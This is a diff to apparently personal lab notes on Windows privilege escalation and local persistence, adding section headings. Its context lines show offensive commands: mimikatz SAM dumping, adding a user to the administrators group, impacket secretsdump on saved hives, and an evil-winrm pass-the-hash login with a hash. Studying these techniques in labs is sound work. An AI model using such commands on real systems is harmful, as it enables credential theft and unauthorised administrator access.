@@ -463,7 +463,9 @@ token::elevate # simply put, this takes us from our administrative shell with hi
 lsadump::sam # list of password
 ```
 # Windows-Local-Persistence ✅
+## Tampering With Unprivileged Accounts ✅
 
+### Assign Group Memberships ✅
 ```powershell
 net localgroup administrators thmuser0 /add # Add User to Administrators Group (Administrators)
 ----------------------------------------------------------
@@ -482,5 +484,9 @@ download sam.bak
 sudo python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
 ----------------------------------------------------------
 evil-winrm -i 10.10.233.240 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
+```
+### Special Privileges and Security Descriptors ✅
+
+```powershell
 
 ```
